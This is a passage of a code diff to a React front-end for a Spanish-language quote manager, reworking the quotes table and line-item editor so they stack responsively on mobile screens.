+                        {c.cliente_telefono && <p className="text-[11px] text-mute">{c.cliente_telefono}</p>}
                       </div>
-                      {c.cliente_telefono && <p className="text-[11px] text-mute">{c.cliente_telefono}</p>}
                     </td>
-                    <td className="px-3 py-3 text-[13px] text-mute">{TIPO_COT_LABEL[c.tipo] || c.tipo}</td>
-                    <td className="px-3 py-3 text-sm font-bold text-price text-right whitespace-nowrap">{orMoney(c.total)}</td>
-                    <td className={`px-3 py-3 text-[13px] whitespace-nowrap ${c.vencida ? 'text-red-600 dark:text-red-500 font-semibold' : 'text-mute'}`}>{fechaCorta(c.vigencia_hasta)}</td>
-                    <td className="px-3 py-3">
+                    <td data-col="Tipo" className="px-3 py-3 text-[13px] text-mute"><span>{TIPO_COT_LABEL[c.tipo] || c.tipo}</span></td>
+                    <td data-col="Total" className="px-3 py-3 text-sm font-bold text-price text-right whitespace-nowrap"><span>{orMoney(c.total)}</span></td>
+                    <td data-col="Vigencia" className={`px-3 py-3 text-[13px] whitespace-nowrap ${c.vencida ? 'text-red-600 dark:text-red-500 font-semibold' : 'text-mute'}`}><span>{fechaCorta(c.vigencia_hasta)}</span></td>
+                    <td data-col="Estado" className="px-3 py-3">
                       <div className="flex items-center gap-1.5">
                         <span className={`inline-flex items-center gap-1.5 text-[11px] font-bold px-2 py-0.5 rounded-full ${m.cls}`}><span className="w-1.5 h-1.5 rounded-full" style={{ background: m.dot }} />{m.label}</span>
                         {c.vencida && <span className="text-[10px] font-bold uppercase px-1.5 py-0.5 rounded bg-red-500/10 text-red-600 dark:text-red-500">Vencida</span>}
                       </div>
                     </td>
                     <td className="px-5 py-3 text-right" onClick={e => e.stopPropagation()}>
-                      <div className="flex items-center justify-end gap-2">
+                      <div className="flex flex-wrap items-center justify-end gap-2">
                         <button onClick={() => setDetalle(c)} className="h-8 px-3 rounded-lg border border-edge text-mute text-xs font-semibold hover:text-ink hover:border-gold/40 transition-colors">Abrir</button>
                         <button onClick={() => setCarta(c)} title="Imprimir cotización" className="w-8 h-8 rounded-lg border border-edge text-mute hover:text-gold hover:border-gold/40 transition-colors flex items-center justify-center">
                           <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.7"><path d="M6 9V4h12v5M6 18H4v-6a2 2 0 012-2h12a2 2 0 012 2v6h-2M8 14h8v6H8z" /></svg>
@@ -7727,9 +7754,12 @@ function CotizacionDetalleModal({ cotizacion, empresas, recienCreada, notify, on
             </div>
             <div className="rounded-xl border border-edge overflow-hidden">
               <div className="overflow-x-auto">
-                <div className="min-w-[640px]">
+                {/* En celular la partida se apila (concepto arriba, los campitos
+                    abajo) para no obligar a scroll horizontal; de md en adelante
+                    vuelve a ser la tabla de siempre con su ancho mínimo. */}
+                <div className="md:min-w-[640px]">
                   {/* Encabezado de columnas */}
-                  <div className="flex items-center gap-2 px-3 py-2.5 bg-surface-2 border-b border-edge text-[10.5px] font-bold uppercase tracking-[0.06em] text-mute">
+                  <div className="hidden md:flex items-center gap-2 px-3 py-2.5 bg-surface-2 border-b border-edge text-[10.5px] font-bold uppercase tracking-[0.06em] text-mute">
                     <div className="flex-1 min-w-0 pl-2">Concepto</div>
                     <div className="w-32 shrink-0">Modalidad</div>
                     <div className="w-16 shrink-0 text-center" title="Cuántas máquinas">Equipos</div>
@@ -7739,13 +7769,18 @@ function CotizacionDetalleModal({ cotizacion, empresas, recienCreada, notify, on
                   </div>
                   {c.items.length === 0 && <div className="px-5 py-6 text-center text-[13px] text-mute">Sin partidas todavía.</div>}
                   {c.items.map(it => (
-                    <div key={it.id} className="flex items-center gap-2 px-3 border-b border-edge last:border-0">
+                    <div key={it.id} className="flex flex-col md:flex-row md:items-center gap-1 md:gap-2 px-3 py-2 md:py-0 border-b border-edge last:border-0">
                       <div className="flex-1 min-w-0 py-1">
                         <input key={`${it.id}-${it.descripcion}`} defaultValue={it.descripcion} disabled={conceptosBloqueados} placeholder="Concepto"
                           onBlur={e => { const v = e.target.value.trim(); if (v && v !== it.descripcion) editarItem(it.id, 'descripcion', v) }}
                           className={celda} />
                       </div>
-                      <div className="w-32 shrink-0 py-1">
+                      {/* `md:contents` disuelve este contenedor en escritorio: los
+                          campos vuelven a ser hijos directos de la fila y conservan
+                          sus anchos de columna. En celular agrupan en su renglón. */}
+                      <div className="flex flex-wrap items-end gap-2 md:contents">
+                      <div className="w-full md:w-32 shrink-0 py-1">
+                        <span className="md:hidden block text-[9.5px] font-bold uppercase tracking-[0.06em] text-mute pl-2">Modalidad</span>
                         <select value={it.modalidad} disabled={conceptosBloqueados} title="¿Se vende o se renta?"
                           onChange={e => cambiarModalidad(it.id, e.target.value as Modalidad)}
                           className={`${celda} cursor-pointer font-medium`}>
@@ -7753,11 +7788,13 @@ function CotizacionDetalleModal({ cotizacion, empresas, recienCreada, notify, on
                         </select>
                       </div>
                       <div className="w-16 shrink-0 py-1">
+                        <span className="md:hidden block text-[9.5px] font-bold uppercase tracking-[0.06em] text-mute text-center">Equipos</span>
                         <input type="number" min={1} defaultValue={it.cantidad} disabled={conceptosBloqueados} title="Cuántas máquinas"
                           onBlur={e => { const v = Math.max(1, Number(e.target.value) || 1); if (v !== it.cantidad) editarItem(it.id, 'cantidad', v) }}
                           className={`${celda} text-center`} />
                       </div>
                       <div className="w-16 shrink-0 py-1">
+                        <span className="md:hidden block text-[9.5px] font-bold uppercase tracking-[0.06em] text-mute text-center">Dur.</span>
                         {/* Duración = periodos de renta; en venta no aplica. */}
                         {it.modalidad === 'venta'
                           ? <div className={`${celda} text-center text-mute cursor-default`}>—</div>
@@ -7766,7 +7803,8 @@ function CotizacionDetalleModal({ cotizacion, empresas, recienCreada, notify, on
                               onBlur={e => { const v = Math.max(1, Number(e.target.value) || 1); if (v !== (it.duracion || 1)) editarItem(it.id, 'duracion', v) }}
                               className={`${celda} text-center`} />}
                       </div>
-                      <div className="w-28 shrink-0 py-1">
+                      <div className="flex-1 min-w-[96px] md:flex-none md:w-28 shrink-0 py-1">
+                        <span className="md:hidden block text-[9.5px] font-bold uppercase tracking-[0.06em] text-mute text-right pr-2">P. Unit</span>
                         <input key={`${it.id}-${it.precio_unitario}`} type="number" min={0} step="0.01" defaultValue={it.precio_unitario} disabled={conceptosBloqueados}
                           onBlur={e => { const v = Number(e.target.value) || 0; if (v !== Number(it.precio_unitario)) editarItem(it.id, 'precio_unitario', v) }}
                           className={`${celda} text-right font-bold tabular-nums`} />
@@ -7778,12 +7816,13 @@ function CotizacionDetalleModal({ cotizacion, empresas, recienCreada, notify, on
                           </p>
                         )}
                       </div>
-                      <div className="w-6 shrink-0 flex justify-center">
+                      <div className="w-6 shrink-0 flex justify-center py-1 md:py-0">
                         {!conceptosBloqueados && (
                           <button onClick={() => quitarItem(it.id)} title="Quitar" className="text-red-500 hover:bg-red-500/10 rounded p-1 transition active:scale-90">
                             <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" d="M6 6l12 12M18 6L6 18" /></svg>
                           </button>
                         )}
+                      </div>
                       </div>
                     </div>
                   ))}
